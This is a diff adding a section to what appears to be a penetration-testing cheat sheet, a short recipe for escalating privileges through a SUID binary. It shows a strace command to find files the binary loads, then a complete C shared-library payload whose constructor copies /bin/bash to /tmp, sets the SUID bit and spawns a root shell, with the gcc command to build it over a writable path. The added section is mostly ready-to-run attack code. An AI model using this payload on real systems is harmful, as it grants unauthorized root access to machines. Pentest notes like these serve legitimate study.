@@ -1093,6 +1093,30 @@ https://gtfobins.github.io/
 Search for systemcrl - SUID
 paste the lines each single
 
+*Escalate SUID Manually*
+
+install strace for analysing what is called by an application
+
+    strace patchToApplication 2>&1 | grep -i -E "open|access|no such file"
+
+Search for something that you as user have writing permissions
+
+Replace it with C script
+
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    static void inject() __attribute__((constructor));
+
+    void inject() {
+        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+    }
+
+Compile with
+
+    gcc -shared -fPIC -o /pathToDeployTo /PathOfTheSourceFile
+
+
 *Reverse Shell one liner*
 
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
